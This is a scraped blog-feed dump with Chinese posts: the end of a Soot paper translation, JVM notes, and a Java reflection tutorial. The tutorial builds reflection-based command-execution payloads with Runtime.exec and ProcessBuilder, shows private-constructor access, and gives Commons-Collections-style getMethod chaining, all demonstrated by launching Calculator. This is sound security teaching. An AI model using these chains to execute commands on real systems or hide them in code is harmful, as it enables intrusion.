Eclipse插件，对Eclipse的更改也已成为（更为严重的）问题。 尽管我们在本文中着重介绍了许多贡献性的变化，但我们希望合并来自非McGill用户的更多Soot贡献。鉴于其他人已经开发出了普遍关注的Soot扩展，这一点尤其正确。 Ways to Improve我们已经在第五节中讨论了特定于Soot的潜在改进。在本节中，我们讨论了改进编译器框架的想法，我们认为这对更广泛的社区感兴趣。 我们认为，有许多原因导致Soot扩展无法重新合并到主要的Soot代码中。首先，应该设计编译器框架，以使其更容易独立发布框架扩展。尽管Eclipse插件系统对于研究编译器可能不必要地复杂，但是拥有一个简单的扩展系统可能仍然有用。由于我们当时还没有想到这个问题，因此在该领域Soot可能会得到很大改善。其次，发布软件既费时又无益。在评估论文时，会议应更加重视软件和数据发布；它们是科学过程中不可或缺的一部分。一些会议，例如ESEC / FSE，开始鼓励与论文一起发布更完整的信息，我们对此趋势表示赞赏。 我们还注意到很难发布框架文件。没有真正的参考文献将Soot描述为系统。我们鼓励会议接受更多的框架文件。 从更高的技术水平来看，Soot在两次通过之间重新计算了很多数据。它必须重新计算数据，因为它不知道有多少数据因中间计算而无效。增量或反应式计算将有助于提高编译器框架的性能。 Reasons for Success我们相信Soot之所以成功，是因为它在正确的时间提供了正确的功能并且易于使用。 我们在第二节中讨论了Soot的功能。 最重要的功能包括：1）Soot对Java的支持； 2）方便的Jimple中间表示； 和3）Spark指针分析工具包。 指针分析特别重要，因为对Java代码的大多数非平凡的分析必须合理地说明指针的行为。 任何编译器框架都将很难使用，但在有足够的决心的情况下，似乎Soot足够可用。 易用性还包括Soot的软件许可，每晚构建和准备偶尔发布的Soot版本（包含来自社区的补丁程序）以及Soot邮件列表中的响应能力。 Acknowledgment致谢。Soot的开发得到了加拿大自然科学与工程研究委员会，魁北克自然与技术基金会，IBM高级研究中心以及Eclipse创新资助的部分支持。 Eric Bodden得到CASED（www.cased.de）的支持。 我们要感谢为Soot的开发提供帮助的所有贡献者，并特别感谢Raja Vall´ee-Rai在Soot方面的开拓性工作。","categories":[{"name":"Papers","slug":"Papers","permalink":"https://0range228.github.io/categories/Papers/"}],"tags":[{"name":"Soot","slug":"Soot","permalink":"https://0range228.github.io/tags/Soot/"}]},{"title":"JVM梳理","slug":"JVM梳理","date":"2020-04-18T06:55:19.000Z","updated":"2021-03-17T08:48:59.094Z","comments":true,"path":"JVM梳理/","link":"","permalink":"https://0range228.github.io/JVM%E6%A2%B3%E7%90%86/","excerpt":"序言 岁月悠悠，衰微只及肌肤；热忱抛却，颓唐必致灵魂 今天来总结一下JVM。","text":"序言 岁月悠悠，衰微只及肌肤；热忱抛却，颓唐必致灵魂 今天来总结一下JVM。 JVM的整体结构JDK：JVM + 基础类库 + 编译工具； JRE：JVM + 基础类库； 说明： 线程私有：虚拟机栈，本地方法栈，程序计数器； 线程共享：堆，方法区； 执行引擎：解释器（Interpreter）、JIT（即时编译器，编译器后端）、GC（垃圾回收器）； JVM直接和操作系统对话； 先经过类加载器，类信息放在方法区中，类的实例对象放在堆中； 解释器逐行解释代码，翻译成机器码； Java代码执行流程 JVM的架构模型 JVM的生命周期 说明： jps查看JVM进程 类加载子系统 加载： 讲图： instanceKlass相当于一种数据结构； 堆中存放Person.class的类对象，这个类对象有instanceKlass的内存地址 instanceKlass也存放着Person类对象的内存地址； 对于Person的实例化对象来说，对象头部存放Person类对象地址； 那么就会先去找class类对象，再间接去元空间去找instanceKlass对象，再之后就会去元空间里面找_Methods,_fields，去调用对象方法。 链接： 验证： 文件格式验证：0xCAFEBABE 元数据验证：对字节码描述的信息进行语义分析 字节码验证：最复杂 通过数据流分析和控制流分析，确定程序是合法的，符合逻辑的 符号饮用验证：确保解析行为可以正常运行 准备： 对于final，static： 基本类型会直接给值 包装类就会先0再赋值 在JDK7之后，静态变量的内存不再方法区内，会跟着类对象存储在堆中。 常量也会在准备阶段被赋值； 解析：其实就是#1-&gt;内存指针的过程； 初始化： 讲图： （）就是给类变量赋值； 类一旦被初始化，那么static{}代码块就会执行； 类加载器分类 启动类加载器 扩展类加载器 应用程序类加载器 用户自定义类加载器 关于ClassLoader 双亲委派机制 沙箱安全机制 类的主动使用和被动使用 运行时数据区 程序计数器 说明： 并行是时刻，并发是时间段； 并行是同时执行，并发是一个时间片内交替执行； 虚拟机栈 说明： 栈空间也可以存放堆中对象的引用值； 栈：每个【线程】运行时需要的内存空间，每个线程只能有一个活动栈桢； 栈桢：每个【方法】运行时需要的内存空间： ​ 局部变量表/操作数栈/动态链接/返回地址 活动栈桢：对应着当前正在执行的方法，往往在栈顶部； 局部变量表 说明：静态方法是不允许使用this关键字的 操作数栈它是由数组实现的 Demo 栈顶缓存技术 动态链接 运行时常量池在方法区中； 方法的调用 虚方法和非虚方法 this/super基本上都是非虚方法，在编译期间就可以确定 invokestatic/invokespecial 如果隐式调用父类的final方法（也就是不加super.），是invokevirtual 但如果super.的方式，则是invokespecial 子类重写也是invokevirtual 方法重写 方法返回地址 本地方法接口 本地方法栈","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://0range228.github.io/tags/JVM/"}]},{"title":"漫谈Java反射","slug":"漫谈Java反射","date":"2020-04-11T08:18:04.000Z","updated":"2021-09-27T12:55:17.430Z","comments":true,"path":"漫谈Java反射/","link":"","permalink":"https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/","excerpt":"序言 看试手，补天裂。 今天来总结一下Java反射，在它面前，任何事物没有任何隐私。","text":"序言 看试手，补天裂。 今天来总结一下Java反射，在它面前，任何事物没有任何隐私。 什么是Java反射？ 将类的各个组成部分封装为其他对象，这就是反射机制。 Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。 让Java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法。 举个例子，Java代码在计算机中经历的三个阶段： source源代码阶段：此时刚刚编译为字节码，仍然保存在硬盘上。 Class类对象阶段：类加载器把Person.class字节码加载进内存。 对于java来说，万物皆对象，那么这时内存里会有一个Person这个类的类对象，也就是Class类对象，这个东西就很抽象。 在Java里面有个类叫做Class，它是来描述所有字节码物理文件的一些共同特征和行为。例如成员变量，构造方法，普通的成员方法。 Class类对象会对重点内容进行封装成成员变量： 成员变量 ——-&gt; Field对象，Field[] fields 构造方法 ——-&gt; Constructor对象，Constructor[] cons 成员方法 ——-&gt; Method对象，Method[] methods 运行时阶段：这个时候类对象已经实例化成为了一个对象 好处： 可以在程序运行过程中，操作对象。例如：获取，设置 可以降低程序耦合性，提高程序的扩展性 如何获取Class类对象？字节码文件阶段 Class.forname(“全类名”)//包名.类名 将字节码文件加载进内存 返回Class类对象 内存阶段 类名.class 当class字节码加载进内存，那么这个Class类对象就有一个类名属性，可以用来索引 运行时阶段 对象.getClass() 所有对象的父类都是Object类，这个类有自己的getClass方法，所有对象都可以拿来用 注意⚠️类名.class 最安全 性能最好 Class.forName() 属于动态加载类。将字节码文件加载进内存，参数需要类的全限定名 使用类名.class来创建Class对象的引用时，不会自动初始化该Class对象 使用Class.forName()会自动初始化该Class对象 Class.forName() 方法 当类加载进了内存，只有静态初始块得到了执行。 getDeclaredxxx 不能获取父类的方法 实例demo字节码阶段123//Class.forName(\"全类名\")Class cls1 = Class.forName(\"domain.Person\");System.out.println(cls1); 内存阶段123//类名.class属性Class cls2 = Person.class;System.out.println(cls2); 运行时阶段1234//对象.getClass()方法Person p = new Person();Class cls3 = p.getClass();System.out.println(cls3); 小细节12345//用==去比较三个class类对象，==比较的是对象的内存地址，如果内存地址相同，那么就是同一个对象System.out.println(cls1 == cls2);//trueSystem.out.println(cls1 == cls3);//true//结论：同一个字节码文件（xx.class）在一次程序运行的过程中，只会被加载一次//不论是哪种方式获取的Class类对象，都是同一个。 实例对照下面看一个demo： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Person &#123; private String name; private int age; //public String a; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public void eat()&#123; System.out.println(\"eat...\"); &#125; public void eat(String food)&#123; System.out.println(\"eat...\"+food); &#125;&#125; 获取Fields 获取成员变量们： Fields[] getFields()：只能获取所有public修饰的成员变量 Fields getField(String name)：获取特定成员变量 Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符，不考虑继承 Fields getDeclaredField(String name)：获取特定的成员变量，【不考虑】修饰符，不考虑继承 1234567Class personClass = Person.class;//Fields[] getFields()：只会获取全部的【public修饰】的成员变量Field[] fields = personClass.getFields();for (Field field : fields) &#123; //由于都是private，什么都不输出 System.out.println(field);&#125; 1234567891011//这里新增测试字段 public a//public String a;Class personClass = Person.class;Field a = personClass.getField(\"a\");//获取成员变量a的值Person p = new Person();Object value = a.get(p);System.out.println(value);//null//设置a的值a.set(p,\"张三\")；System.out.println(p);//Person&#123;name='null',age=0,a='张三'&#125; 123456789//这里新增测试字段private d//private String dClass personClass = Person.class;Field[] declaredFields = personClass.getDeclaredFields();// 获取所有的成员变量，不考虑修饰符，这个方法超级暴力for (Field declaredField : declaredFields) &#123; //由于都是private，什么都不输出 System.out.println(declaredField);&#125; 12345678Class personClass = Person.class;Person p = new Person();Field d = personClass.getDeclaredField(\"d\");//当访问private时，忽略访问权限符的安全检查//暴力反射d.setAccessible(true);Object value= d.get(p);System.out.println(value);//null,因为初始化，还没有设置值 获取Constructor 获取构造方法们： Constructor[] getConstructors() Constructor getConstructor(类 &lt;?&gt; … parameterTypes) Constructor getDeclaredConstructors() Constructor getDeclaredConstructor(类 &lt;?&gt; … parameterTypes) 123456Class personClass = Person.class;Constructor constructor = personClass.getConstructor(String.class,int.class);//每一个构造方法的参数种类不一样，这一步是获取构造方法System.out.println(constructor);//所以可以执行构造函数，进而创建对象，[构造器.newInstance]Object person = constructor.newInstance(\"张三\", 23);//传递对应的参数值System.out.println(person);//Person&#123;name=‘张三‘，age=’23‘&#125; 1234Class personClass = Person.class;//对于无参的构造方法，可以直接使用Class类对象的newInstance方法Object o = personClass.newInstance();System.out.println(o); 获取Methods 获取成员方法们： Method[] getMethods()//获取所有【public】修饰的方法，父类Object的方法也能看到 Method getMethod(String name，类 &lt;?&gt; … parameterTypes) Method[] getDeclaredMethods()//获取所有声明方法 不考虑修饰符 不考虑继承的方法 Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes) 不考虑修饰符 不考虑继承的方法 12345678Class personClass = Person.class;//获取制定名称的方法Method eat_Method = personClass.getMethod(\"eat\");//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表Person pp = new Person();//因为是空参方法，所以直接放进来一个对象就行//执行方法，eat...eat_Method.invoke(pp); 123Class personClass = Person.class;Method eat_Method2 = personClass.getMethod(\"eat\",String.class);//eat方法重载，eat方法的需要传入的参数是String类型eat_Method2.invoke(pp,\"jiaozi\");//吃饺子 1234567891011Class personClass = Person.class;Method[] methods = personClass.getMethods();//获取所有public方法名//获取类名String className = personClass.getName;//获取类名System.out.println(className);//包名.类名for (Method method : methods) &#123; //也支持暴力反射：method.setAccessible(true); System.out.println(method); //获取所有方法名 String methodname = method.getName(); System.out.println(methodname); 灵魂体现这里引入一个实际利用中的小demo： 1234public void execute(String className, String methodName) throws Exception &#123; Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); &#125; 这里分步解读： 首先两个参数：className、methodName分别代表了传入的类名和方法名。 首先Class clazz = Class.forName(className);这里的意思是在字节码层面，先获取你的Class类对象clazz。 接下来clazz.getMethod(methodName).invoke(clazz.newInstance());这里的含义可以分步解读： clazz.getMethod(methodName)这里我先根据传进来的方法名methodName获取你的Method对象; 接下来.invoke(clazz.newInstance())这个含义是对于我获取的method方法对象，我要执行这个方法，那么问题来了，我如何才能执行这个方法呢？？？ 这里我先clazz.newInstance()，这一手的含义是我要先生成一个指定类的对象，那么如何生成呢？之前我已经获取了Class类对象，那么就可以用这个类对象来生成这个类的实例化对象 clazz.newInstance()这样就可以生成一个实例化对象了 那么有了类的实例化对象之后，直接放入invoke参数里面，就可以凭借我们之前的Method对象来执行这个特殊的className方法了! 说了这么多嗷，我分步拆开来写一下，会更清晰一些： 12345678910public void execute(String className, String methodName) throws Exception &#123; //首先找到类对象 Class clazz = Class.forName(className); //根据类对象找到Method方法对象 Method mtd = clazz.getMethod(methodName); //动态生成类实例化对象obj Object obj = clazz.newInstance(); //调用类中方法mtd mtd.invoke(obj); &#125; 以下一步步使用反射机制实现Runtime.getRuntime().exec(&quot;calc.exe&quot;);这个语句 getRuntime()：其实就是Runtime类获取对象的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。 exec()：调用exec函数 calc.exe：调用计算器程序 类的初始化这里我再写一个小demo： 12345678910111213141516package domain;public class TrainPrint &#123; //初始块 &#123; System.out.printf(\"Empty block initial %s\\n\", this.getClass()); &#125; //静态初始块 static &#123; System.out.printf(\"Static initial %s\\n\", TrainPrint.class); &#125; //构造函数 public TrainPrint() &#123; System.out.printf(\"Initial %s\\n\", this.getClass()); &#125;&#125; 首先我写一个测试类，对于这个测试类，它有初始块，静态初始块，构造函数。 那么下面我来获取它的Class对象，想看看当这个TrainPrint测试类加载进内存之后，哪些部分执行了，好主意，说写就写： 首先类的初始化: 12345678910package reflect;import java.io.IOException;import domain.TrainPrint;public class initTest &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; Class.forName(\"domain.TrainPrint\"); &#125;&#125; 执行结果：Static initial class domain.TrainPrint 这说明当类加载进了内存，只有静态初始块得到了执行。 那么类的实例化呢: 12345678910package reflect;import java.io.IOException;import domain.TrainPrint;public class initTest &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; TrainPrint test= new TrainPrint(); &#125;&#125; 执行结果： 123Static initial class domain.TrainPrintEmpty block initial class domain.TrainPrintInitial class domain.TrainPrint 这也暴露了顺序：静态初始块-&gt;初始块-&gt;构造函数 补充： 具有父类的类的实例化：父类静态初始块-&gt;子类静态初始块-&gt;父类初始块-&gt;父类构造函数-&gt;子类初始块-&gt;子类构造函数具有父类的类的实例化：父类静态初始块-&gt;子类静态初始块 以上对于类初始化的说明其实就是说，单独一个Class.forName()，在类静态初始块可控的情况下，可以执行恶意代码。 调用内部类Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class，可以把他们看作两个无关的类。 Class.forName(&quot;C1$C2&quot;)可以调用这个内部类。 我们可以通过Class.forName(&quot;java.lang.Runtime&quot;)来获取类（java.lang.Runtime是Runtime类的完整路径） getMethodJava中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class) invokeinvoke方法位于Method类下，其作用是传入参数，执行方法，public Object invoke(Object obj, Object... args)它的第一个参数是执行method的实例化对象： 如果这个方法是一个普通方法，那么第一个参数是类对象。 如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，null也行），它接下来的参数才是需要传入的参数。 由于我们的exec函数是一个普通方法，需要传入类对象，即invoke(类对象，exec方法传入的参数) 。之前说到Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。 获取类对象： (由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)12345678910&#96;invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)&#96;合并：&#96;&#96;&#96;javaClass.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class). invoke( Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke( Class.forName(&quot;java.lang.Runtime&quot;)),&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;); 再简化一下： 12Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz), \"/Applications/Calculator.app/Contents/MacOS/Calculator\"); 详细解读，这里是一个疯狂套娃的过程： 首先先要找到类对象，clazz，不多说了 接下来我要告诉这个类对象我要执行的方法是exec，这个exec方法接受的参数类型是String类型，当然就是恶意命令字符串 那么我们的invoke函数需要的操作就是invoke(类对象，exec方法等待接收的参数)，那么问题来了：Runtime类不允许newInstance()来实例化对象！！！但是他允许通过getRuntime方法返回一个对象，那么我就用getRuntime方法来返回一个对象！ 现在开始疯狂套娃！ 首先既然你不允许instance，那么我就在那个类对象的位置“套”出来一个对象！思路其实就是既然我没办法给你在那个位置“放”上一个实例化对象，那么我就在你的位置上使用反射invoke执行getRuntime方法，不就可以了么！ 那么就有了简化版代码！ 这里仔细看，可以看到，其实getRuntime方法它也是一个无参构造方法！ 指定的构造方法生成类的实例继续举一个演化成反射机制的执行命令payload的例子： 1234List&lt;String&gt; paramList = new ArrayList&lt;&gt;();paramList.add(\"/Applications/Calculator.app/Contents/MacOS/Calculator\");ProcessBuilder pb = new ProcessBuilder(paramList);pb.start(); 可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。 ProcessBuilder有两个构造函数： public ProcessBuilder(List command) public ProcessBuilder(String... command)(此处，String...这种语法表示String参数数量是可变的，与String[]一样) getConsturctor()函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，getConsturctor(参数类型) 选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即newInstance(传入的构造函数参数)。 start函数不是一个静态函数,需要传入类的实例，所以这里可以继续使用反射： 12Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"))); 这里还有一种方式： 123//这个可以传入多个字符串ProcessBuilder pb = new ProcessBuilder(\"/Applications/Calculator.app/Contents/MacOS/Calculator\");pb.start(); 那么payload就这样写吧： 12Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;)).start(); 但是实际上我们这样调用是会报错的，因为newInstance函数接受参数是一个Object..也就是Object数组，它会完美契合我们提供的String[]，剥去一层数组。 那就再套一层： 12Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;&#125;)).start(); 执行私有方法以上都是方法或构造方法是public函数，但是如果是私有方法，该如何调用？之前用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor： getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法 getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了 之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我就来调用Runtime的构造方法来获取一个实例来执行计算器弹出： 1234Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor m = clazz.getDeclaredConstructor(); m.setAccessible(true); //暴力反射clazz.getMethod(\"exec\", String.class).invoke(m.newInstance(), \"/Applications/Calculator.app/Contents/MacOS/Calculator\"); 在获取到私有方法后，通过setAccessible(true)可以打破私有方法访问限制，从而进行调用。 从Commons-collections收获的一点反思对于正常的反射模板： 1Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) 但其实我们很容易忽略反射机制中调用的函数实际上可以在两个不同的class中调用，就像好比有一个函数可以在两个class中调用。 在Commons-Collections的环境中，我们是没法得到Class.forName(&quot;java.lang.Runtime&quot;).getMethod(...)的，但是可以得到Class.forName(&quot;java.lang.Class&quot;).getMethod(...)。 可以理解为我们可以抓到Runtime的父类，那么就可以得到以下途径进行变形： 用反射机制去调用反射机制中使用的函数getMethod 使用invoke传入的obj去指定getMethod的当前的调用环境（在实际代码执行中是this变量的区别） 继续看一下Class类中getMethod方法的接口： 12345678910@CallerSensitivepublic Method getMethod(String name, Class&lt;?&gt;... parameterTypes)////&lt;?&gt;... 表示任意类型任意数量的Class数组 throws NoSuchMethodException, SecurityException &#123; checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true); Method method = getMethod0(name, parameterTypes, true); if (method == null) &#123; throw new NoSuchMethodException(getName() + \".\" + name + argumentTypesToString(parameterTypes)); &#125; return method;&#125; 那么我们传数组，来拿到getmethod这个方法不就行了么： 12Method method1= Class.forName(\"java.lang.Class\") .getMethod(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;);//根据getMethod方法接口进行封装 以下套娃警告！ 这里的Class类，它有所有方法，我们就是先拿到getmethod这个方法，这里是为什么呢？因为对于想用反射来调用方法其他类的方法，你必须会用到getmethod方法（忘了的向上翻模板），这里就相当于我先把梯子拿到！ 那么有了getmethod方法之后，我需要一个obj对象来调用呀，这个obj其实就是java.lang.Runtime。之前也说了，这个对象很有脾气，需要执行这个类下面的Runtime方法，才能实例化一个Runtime对象。 结合上面刚刚获取的getmethod梯子方法，继续写吧： 1234//以下语句执行结果等同于Class.forName(\"java.lang.Runtime\").getMethod(getRunime)method1.invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]);//用于对比：以下语句等同于Class.forName(\"java.lang.Class\").getMethod(getRunime)//method1.invoke(Class.forName(\"java.lang.Class\"),\"getRuntime\",new Class[0]); 合起来就是： 123456// 1.正常的反射调用Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\")// 2.经过变形的反射调用，需要绕一圈Class.forName(\"java.lang.Class\") .getMethod(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法 .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]);//new Class[0]其实就是占位 new Class[0]其实就是占位，因为阅读源码能看到invoke方法参数规范，是硬性标准需要两个参数的，第二个是一个Object类的数组： 1234567891011121314151617@CallerSensitivepublic Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException&#123; if (!override) &#123; if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123; Class&lt;?&gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); &#125; &#125; MethodAccessor ma = methodAccessor; // read volatile if (ma == null) &#123; ma = acquireMethodAccessor(); &#125; return ma.invoke(obj, args);&#125; 所以现在我们只是以Class.forName(&quot;java.lang.Class&quot;)开头获取到了Runtime类下的getRuntime方法。还没有执行。 神奇的invoke参数自己写完总觉得invoke参数奇奇怪怪的，淦，研究一下。 invoke有一个非常神奇的特性，它不会那么严格地校验obj。回顾之前总结的invoke传参规则： 它的第一个参数是执行method的对象obj： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类它接下来的参数才是需要传入的参数。 但是，传入的第一个参数其实不一定要是正确的类或者类对象! 下面一个小例子： 12345678//main函数Class.forName(\"a\").getMethod(\"print\").invoke(null);//内部类：class a&#123; public static void print()&#123; System.out.println(1); &#125;&#125; 按照规则，print函数是一个静态方法，实际上我们应该invoke传入一个a的类。但是以上代码的执行结果却是成功的： 但是如果print方法不是静态防范时就会执行失败： 这是因为invoke函数null抛出报错的机制导致的： 123456* @exception NullPointerException * if the specified object is null and the method is an instance method. //obj为null，并且method是一个实例method*/@CallerSensitivepublic Object invoke(Object obj, Object... args)&#123;&#125; 当method是一个普通函数时，传入obj不能为null，并且其类对象要与方法匹配；但是当method是一个静态函数时，就很随便了(可能是因为压根不会被用到吧)。 这里我迷茫了好久，知道我看到这样一句话才弄懂： 类实例是其他类的实例，类实际上是Class.class这个类的实例。这边之前的疑问是，getMethod不是静态方法而invoke中传入的是类而不是类实例。实际上因为getMethod本来就是class类中的方法，而Class.forName(&quot;java.lang.Runtime&quot;)获取到的class类的实例我们调用getMethod传入的不是之前的模糊类的概念，而是class类的实例（类实例），所以这里是没毛病的调用class类下的非静态方法，传入class类实例。 回来继续构造调用上面我们只是获取到了getRuntime方法，我们还没有调用这个方法获取其Runtime对象 12345678910111213//普通调用形式Runtime.getRuntime()// 反射调用Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))// 经过变形的反射调用Method method = (Method) Class.forName(\"java.lang.Class\") .getMethod(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法，这个方法需要两个型参，这里要列好，分别是String和Class .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]);//调用getMethod方法，得到getRuntime方法//以上等于执行Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\")//调用Runtime.getRuntime函数，传入的obj根据上面的分析可以随便写method.invoke(Class.forName(\"java.lang.Runtime\"),new Object[0]);method.invoke(null,new Object[0]);method.invoke(Class.forName(\"java.lang.String\"),new Object[0]); 搞懂invoke函数直接上源码： 12345678910111213141516171819package java.lang.reflect;public final class Method extends AccessibleObject implements GenericDeclaration,Member...public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException&#123; if (!override) &#123; if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123; Class&lt;?&gt; caller = Reflection.getCallerClass(1); checkAccess(caller, clazz, obj, modifiers); &#125; &#125; MethodAccessor ma = methodAccessor; // read volatile if (ma == null) &#123; ma = acquireMethodAccessor(); &#125; return ma.invoke(obj, args);&#125; override参数 它是父类AccessibleObject的一个属性，AccessibleObject这个类有三个子类：构造函数、属性、方法。 override这个值默认是false，但是我们可以通过method.setAccessible(true)来改掉它的值。 Reflection.quickCheckMemberAccess(clazz, modifiers) 如果是override是默认值false，那么继续往下走。 我们这里假设：m.invoke(obj,args) 参数： clazz：m所属类的Class对象 args：m的所需参数 这里quickCheckMemberAccess先检查Class对象是不是public的。 如果是public,那么就跳出本方法； 如果不是public,那继续来到Reflection.getCallerClass(1); 这是一个native方法，返回的是获取调用这个方法的Class对象，赋值给caller 1public static native Class&lt;?&gt; getCallerClass(); checkAccess 然后通过checkAccess(checkAccess(caller, clazz, obj, modifiers)做一次快速的权限校验 不难看出，还进行了一个很简单的缓冲机制，只适用于一个类的重复调用。 MethodAccessor ma = methodAccessor; 接下来是重头戏： 123456MethodAccessor ma = methodAccessor; // read volatileif (ma == null) &#123; ma = acquireMethodAccessor();&#125;return ma.invoke(obj, args); 首先要了解Method对象的基本构成，每个Java方法有且只有一个Method对象作为root，它相当于根对象，对用户不可见。当我们创建Method对象时，我们代码中获得的Method对象都相当于它的副本（或引用）。root对象持有一个MethodAccessor对象，所以所有获取到的Method对象都共享这一个MethodAccessor对象，因此必须保证它在内存中的可见性。当第一次调用一个Java方法对应的Method对象的invoke()方法之前，实现调用逻辑的MethodAccessor对象还没有创建(第一次调用，methodAccessor属性为null)，所以通过reflectionFactory创建MethodAccessor并更新给root，然后调用MethodAccessor.invoke()完成反射调用。 具体细看，可以看到invoke方法实际是委派给了MethodAccessor类型的ma对象来处理。MethodAccessor是一个接口，主要有两个实现类。 一个委派实现(DelegatingMethodAccessorImpl)，一个本地实现(NativeMethodAccessorImpl)。这里调用的委派实现主要是为了在本地实现和动态实现之间做切换。考虑到许多反射调用仅会执行一次，Java虚拟机设置了一个阈值15(是从0开始计算,&gt;15)： 当某个反射调用的调用次数&lt;=15 时，采用本地实现； 当大于15时，便开始动态生成字节码，并将委派实现的委派对象切换至动态实现。这个过程我们称之为Infation。 这里我们以NativeMethodAccessorImpl本地实现为例： 每次调用其invoke时会做一个累加，判断是否到达阙值，如果没有则调用native的invoke0方法，当超过时则调用MethodAccessorGenerator.generateMethod()，并将其设置到DelegatingMethodAccessorImpl的delegate，这样下次就会直接调用到动态实现的位置。 m.invoke(o，args) invoke0参数： this.method 就是m var1就是o，如果m是静态方法的话，这里写null也可以 var2就是args参数 我们重点分析一下invoke0这个native方法： 12345JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0(JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args)&#123; return JVM_InvokeMethod(env, m, obj, args);&#125; 借用ruilin的图，继续看JVM_InvokeMethod方法： 发现提到了oop，简单写一下oop-klass理解： JVM就是用这种方式，将一个对象的数据和对象模型进行分离。普遍意义上来说，我们说持有一个对象的引用，指的是图中的handle(存放在栈区)，它是oop(存放在堆区)的一个封装。 关键点是： 1oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL); 跟进hotspot/src/share/vm/runtime/reflection.cpp Reflection::invoke_method()中接受的method_mirror(oop)就是我们要反射调用的方法。然后代码调用了Reflection::invoke()，跟进之后最终到JavaCalls::call()执行 最后的os_exception_wrapper其实就是调用了call_help，也就是说本地实现的反射最终的方法执行是通过JavaCalls::call_helper方法来完成的。 